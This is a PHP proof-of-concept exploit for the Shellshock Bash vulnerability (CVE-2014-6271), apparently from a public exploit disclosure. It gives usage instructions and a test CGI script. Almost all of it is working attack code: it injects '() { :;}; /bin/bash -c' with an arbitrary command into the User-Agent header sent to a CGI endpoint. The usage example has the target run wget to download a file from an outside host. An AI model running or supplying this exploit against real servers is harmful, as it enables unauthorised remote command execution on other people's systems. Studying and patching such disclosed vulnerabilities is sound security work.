<?php
/*
Title: Bash Specially-crafted Environment Variables Code Injection Vulnerability
CVE: 2014-6271
Vendor Homepage: https://www.gnu.org/software/bash/
Author: Prakhar Prasad && Subho Halder
Author Homepage: https://prakharprasad.com && https://appknox.com
Date: September 25th 2014
Tested on: Mac OS X 10.9.4/10.9.5 with Apache/2.2.26
	   GNU bash, version 3.2.51(1)-release (x86_64-apple-darwin13)
Usage: php bash.php -u http://<hostname>/cgi-bin/<cgi> -c cmd
	   Eg. php bash.php -u http://localhost/cgi-bin/hello -c "wget http://appknox.com -O /tmp/shit"
Reference: https://www.reddit.com/r/netsec/comments/2hbxtc/cve20146271_remote_code_execution_through_bash/

Test CGI Code : #!/bin/bash
				echo "Content-type: text/html"
				echo ""
				echo "Bash-is-Vulnerable"

*/
error_reporting(0);
if(!defined('STDIN')) die("Please run it through command-line!\n");
$x  = getopt("u:c:");
if(!isset($x['u']) || !isset($x['c']))
{
	die("Usage: ".$_SERVER['PHP_SELF']." -u URL -c cmd\n");

}
$url = $x['u'];
$cmd = $x['c'];

$context = stream_context_create(
	array(
		'http' => array(
			'method'  => 'GET',
			'header'  => 'User-Agent: () { :;}; /bin/bash -c "'.$cmd.'"'
		)
	)
);
$req = file_get_contents($url, false, $context);
if(!$req && strpos($http_response_header[0],"500") > 0 )
	die("Command sent to the server!\n");
else if($req && !strpos($http_response_header[0],"500") > 0)
	die("Server didn't respond as it should!\n");
else if(!$req && $http_response_header == NULL)
	die("A connection error occurred!\n")
?>